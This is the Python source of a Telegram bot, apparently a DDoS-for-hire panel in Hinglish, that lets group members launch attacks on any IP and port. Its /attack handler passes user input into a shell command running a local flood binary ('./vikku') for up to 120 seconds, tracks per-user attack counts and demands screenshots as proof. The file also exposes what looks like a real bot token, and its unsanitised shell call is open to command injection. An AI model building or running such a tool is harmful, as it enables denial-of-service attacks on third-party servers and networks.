import telebot
import datetime
import time
import subprocess
import threading
from telebot import types

# TELEGRAM BOT TOKEN
bot = telebot.TeleBot('7849055457:AAHLR1sugPxsNI8ELSIXqCDf4CX0rL2oecQ')

# GROUP AND CHANNEL DETAILS
GROUP_ID = "-1002650037232"
CHANNEL_USERNAME = "@vikkugameryt"
SCREENSHOT_CHANNEL = "@vikku_107"
ADMINS = [6957116305]

# GLOBAL VARIABLES
is_attack_running = False
attack_end_time = None
pending_feedback = {}
warn_count = {}
attack_logs = []
user_attack_count = {}

# FUNCTION TO CHECK IF USER IS IN CHANNEL
def is_user_in_channel(user_id):
    try:
        member = bot.get_chat_member(CHANNEL_USERNAME, user_id)
        return member.status in ['member', 'administrator', 'creator']
    except:
        return False

# SCREENSHOT VERIFICATION FUNCTION
def verify_screenshot(user_id, message):
    if user_id in pending_feedback:
        bot.forward_message(SCREENSHOT_CHANNEL, message.chat.id, message.message_id)
        bot.send_message(SCREENSHOT_CHANNEL, f"📸 **𝗨𝗦𝗘𝗥 `{user_id}` 𝗞𝗔 𝗦𝗖𝗥𝗘𝗘𝗡𝗦𝗛𝗢𝗧 𝗩𝗘𝗥𝗜𝗙𝗜𝗘𝗗!** ✅")
        bot.reply_to(message, "✅ 𝗦𝗖𝗥𝗘𝗘𝗡𝗦𝗛𝗢𝗧 𝗠𝗜𝗟 𝗚𝗔𝗬𝗔! 𝗔𝗕 𝗧𝗨 𝗡𝗔𝗬𝗔 𝗔𝗧𝗧𝗔𝗖𝗞 𝗟𝗔𝗚𝗔 𝗦𝗔𝗞𝗧𝗔 𝗛𝗔𝗜. 🚀")
        del pending_feedback[user_id]  
    else:
        bot.reply_to(message, "❌ 𝗔𝗕 𝗦𝗖𝗥𝗘𝗘𝗡𝗦𝗛𝗢𝗧 𝗕𝗛𝗘𝗝𝗡𝗘 𝗞𝗜 𝗭𝗔𝗥𝗢𝗢𝗥𝗔𝗧 𝗡𝗔𝗛𝗜 𝗛𝗔𝗜!")

# HANDLE ATTACK COMMAND
@bot.message_handler(commands=['attack'])
def handle_attack(message):
    global is_attack_running, attack_end_time
    user_id = message.from_user.id
    command = message.text.split()

    if message.chat.id != int(GROUP_ID):
        bot.reply_to(message, "🚫 𝗬𝗘𝗛𝗔 𝗡𝗔𝗛𝗜 𝗖𝗛𝗔𝗟𝗘𝗚𝗔 𝗕𝗥𝗢 @vikkugameryt 𝗞𝗔 𝗚𝗥𝗢𝗨𝗣 𝗝𝗢𝗜𝗡 𝗞𝗥! ❌")
        return

    if not is_user_in_channel(user_id):
        bot.reply_to(message, f" 𝗣𝗘𝗛𝗟𝗘 𝗖𝗛𝗔𝗡𝗡𝗘𝗟 𝗝𝗢𝗜𝗡 𝗞𝗔𝗥!{CHANNEL_USERNAME}")
        return

    if pending_feedback.get(user_id, False):
        bot.reply_to(message, "𝗣𝗘𝗛𝗟𝗘 𝗦𝗖𝗥𝗘𝗘𝗡𝗦𝗛𝗢𝗧 𝗕𝗛𝗘𝗝, 𝗪𝗔𝗥𝗡𝗔 𝗡𝗔𝗬𝗔 𝗔𝗧𝗧𝗔𝗖𝗞 𝗡𝗔𝗛𝗜 𝗟𝗔𝗚𝗘𝗚𝗔! 😡")
        return

    if is_attack_running:
        bot.reply_to(message, "⚠️ 𝗘𝗞 𝗔𝗧𝗧𝗔𝗖𝗞 𝗔𝗟𝗥𝗘𝗔𝗗𝗬 𝗖𝗛𝗔𝗟 𝗥𝗔𝗛𝗔 𝗛 𝗨𝗦𝗞𝗢 /check 𝗞𝗔𝗥 𝗦𝗔𝗞𝗧𝗔 𝗛𝗔𝗜")
        return

    if len(command) != 4:
        bot.reply_to(message, "⚠️ USAGE: /attack <IP> <PORT> <TIME>")
        return

    target, port, time_duration = command[1], command[2], command[3]

    try:
        port = int(port)
        time_duration = int(time_duration)
    except ValueError:
        bot.reply_to(message, "❌ 𝗣𝗢𝗥𝗧 𝗔𝗨𝗥 𝗧𝗜𝗠𝗘 𝗡𝗨𝗠𝗕𝗘𝗥 𝗛𝗢𝗡𝗘 𝗖𝗛𝗔𝗛𝗜𝗬𝗘!")
        return

    if time_duration > 120:
        bot.reply_to(message, "🚫 120𝙎 𝙎𝙀 𝙕𝙔𝘼𝘿𝘼 𝘼𝙇𝙇𝙊𝙒𝙀𝘿 𝙉𝘼𝙃𝙄 𝙃𝘼𝙄!")
        return

    confirm_msg = f"🔥 𝗔𝗧𝗧𝗔𝗖𝗞 𝗗𝗘𝗧𝗔𝗜𝗟𝗦:\n🎯 𝗧𝗔𝗥𝗚𝗘𝗧: `{target}`\n🔢 𝗣𝗢𝗥𝗧: `{port}`\n⏳ 𝗗𝗨𝗥𝗔𝗧𝗜𝗢𝗡: `{time_duration}S`\n𝗦𝗧𝗔𝗧𝗨𝗦: `𝗖𝗛𝗔𝗟 𝗥𝗔𝗛𝗔 𝗛𝗔𝗜𝗡...`\n📸 𝗔𝗧𝗧𝗔𝗖𝗞 𝗞𝗘 𝗕𝗔𝗔𝗗 𝗦𝗖𝗥𝗘𝗘𝗡𝗦𝗛𝗢𝗧 𝗕𝗛𝗘𝗝𝗡𝗔 𝗭𝗔𝗥𝗢𝗢𝗥𝗜 𝗛𝗔𝗜!"

    bot.send_message(message.chat.id, confirm_msg, parse_mode="Markdown")

    # PIN ATTACK STATUS
    bot.pin_chat_message(message.chat.id, message.message_id)

    is_attack_running = True
    attack_end_time = datetime.datetime.now() + datetime.timedelta(seconds=time_duration)
    pending_feedback[user_id] = True  

    bot.send_message(message.chat.id, f"🚀 𝗬𝗼𝘂𝗿 𝗮𝘁𝘁𝗮𝗰𝗸 𝘀𝘁𝗮𝗿𝘁𝗲𝗱 🇮🇳!\n🎯 `{target}:{port}`\n⏳ {time_duration}S\n𝗦𝗲𝗻𝗱 𝗺𝗲 𝘀𝗰𝗿𝗲𝗲𝗻𝘀𝗵𝗼𝘁 📷", parse_mode="Markdown")

    # Attack Execution
    try:
        subprocess.run(f"./vikku {target} {port} {time_duration} 1200", shell=True, check=True, timeout=time_duration)
    except subprocess.TimeoutExpired:
        bot.reply_to(message, "𝗔𝘁𝘁𝗮𝗰𝗸 𝗳𝗶𝗻𝗶𝘀𝗵𝗲𝗱 ✅! 🚨")
    except subprocess.CalledProcessError:
        bot.reply_to(message, "𝗔𝘁𝘁𝗮𝗰𝗸 𝗳𝗶𝗻𝗶𝘀𝗵𝗲𝗱 ✅!")
    finally:
        is_attack_running = False
        attack_end_time = None  
        bot.send_message(message.chat.id, "✅ 𝗬𝗼𝘂𝗿 𝗮𝘁𝘁𝗮𝗰𝗸 𝗰𝗼𝗺𝗽𝗹𝗲𝘁𝗲𝗱 ✅! 🎯\n📸 𝗽𝗹𝗲𝗮𝘀𝗲 𝘀𝗲𝗻𝗱 𝗼𝗹𝗱 𝗮𝘁𝘁𝗮𝗰𝗸 𝘀𝗰𝗿𝗲𝗲𝗻𝘀𝗵𝗼𝘁 ✅!")

        # UNPIN ATTACK STATUS
        bot.unpin_chat_message(message.chat.id)

        # ATTACK LOGS
        attack_logs.append(f"{user_id} -> {target}:{port} ({time_duration}s)")
        user_attack_count[user_id] = user_attack_count.get(user_id, 0) + 1

# AUTO ANNOUNCEMENT SYSTEM
def auto_announcement():
    while True:
        time.sleep(21600)  # 6 HOURS
        bot.send_message(GROUP_ID, "📢 **𝗚𝗥𝗣 𝗨𝗣𝗗𝗔𝗧𝗘:** 𝗥𝗨𝗟𝗘𝗦 𝗙𝗢𝗟𝗟𝗢𝗪 𝗞𝗔𝗥𝗢, 𝗪𝗔𝗥𝗡𝗔 𝗕𝗔𝗡 𝗣𝗔𝗞𝗞𝗔!! 🚀")

# HANDLE SCREENSHOT SUBMISSION
@bot.message_handler(content_types=['photo'])
def handle_screenshot(message):
    user_id = message.from_user.id
    verify_screenshot(user_id, message)

# ADMIN RESTART COMMAND (ONLY ADMINS)
@bot.message_handler(commands=['restart'])
def restart_bot(message):
    if message.from_user.id in ADMINS:
        bot.send_message(message.chat.id, "♻️ 𝗕𝗢𝗧 𝗥𝗘𝗦𝗧𝗔𝗥𝗧 𝗛𝗢 𝗥𝗔𝗛𝗔 𝗛𝗔𝗜...")
        time.sleep(2)
        subprocess.run("python3 nm.py", shell=True)
    else:
        bot.reply_to(message, "🚫 𝗦𝗜𝗥𝗙 𝗔𝗗𝗠𝗜𝗡 𝗛𝗜 𝗥𝗘𝗦𝗧𝗔𝗥𝗧 𝗞𝗔𝗥 𝗦𝗔𝗞𝗧𝗔 𝗛𝗔𝗜!")

# HANDLE CHECK COMMAND
@bot.message_handler(commands=['check'])
def check_status(message):
    if is_attack_running:
        remaining_time = (attack_end_time - datetime.datetime.now()).total_seconds()
        bot.reply_to(message, f"✅ **𝗔𝗧𝗧𝗔𝗖𝗞 𝗖𝗛𝗔𝗟 𝗥𝗔𝗛𝗔 𝗛𝗔𝗜!**\n⏳ **𝗕𝗔𝗖𝗛𝗔 𝗛𝗨𝗔 𝗧𝗜𝗠𝗘:** {int(remaining_time)}S")
    else:
        bot.reply_to(message, "❌ 𝗞𝗢𝗜 𝗔𝗧𝗧𝗔𝗖𝗞 𝗔𝗖𝗧𝗜𝗩𝗘 𝗡𝗔𝗛𝗜 𝗛𝗔𝗜")

# ATTACK STATS SYSTEM
@bot.message_handler(commands=['stats'])
def attack_stats(message):
    stats_msg = "📊 **ATTACK STATS:**\n\n"
    for user, count in user_attack_count.items():
        stats_msg += f"👤 `{user}` ➝ {count} ATTACKS 🚀\n"
    bot.send_message(message.chat.id, stats_msg, parse_mode="Markdown")

# HANDLE WARN SYSTEM
@bot.message_handler(commands=['warn'])
def warn_user(message):
    if message.from_user.id not in ADMINS:
        return

    if not message.reply_to_message:
        bot.reply_to(message, "❌ 𝗞𝗜𝗦𝗜 𝗞𝗢 𝗪𝗔𝗥𝗡 𝗞𝗔𝗥𝗡𝗘 𝗞𝗘 𝗟𝗜𝗬𝗘 𝗨𝗦𝗞𝗘 𝗠𝗘𝗦𝗦𝗔𝗚𝗘 𝗣𝗘 𝗥𝗘𝗣𝗟𝗬 𝗞𝗔𝗥𝗢!")
        return

    user_id = message.reply_to_message.from_user.id
    warn_count[user_id] = warn_count.get(user_id, 0) + 1

    if warn_count[user_id] >= 3:
        bot.kick_chat_member(GROUP_ID, user_id)
        bot.send_message(GROUP_ID, f"🚫 **𝗨𝗦𝗘𝗥𝗦 {user_id} 𝗞𝗢 𝟯 𝗪𝗔𝗥𝗡 𝗠𝗜𝗟 𝗖𝗛𝗨𝗞𝗘 𝗧𝗛𝗘, 𝗜𝗦𝗟𝗜𝗬𝗘 𝗕𝗔𝗡 𝗞𝗔𝗥 𝗗𝗜𝗬𝗔 𝗚𝗔𝗬𝗔!**")
    else:
        bot.send_message(GROUP_ID, f"⚠️ **𝗨𝗦𝗘𝗥𝗦 {user_id} 𝗞𝗢 𝗪𝗔𝗥𝗡𝗜𝗡𝗚 {warn_count[user_id]}/𝟯 𝗪𝗔𝗥𝗡𝗜𝗡𝗚 𝗠𝗜𝗟 𝗚𝗔𝗬𝗜 𝗛𝗔𝗜!**")

# START POLLING
threading.Thread(target=auto_announcement).start()
bot.polling(none_stop=True)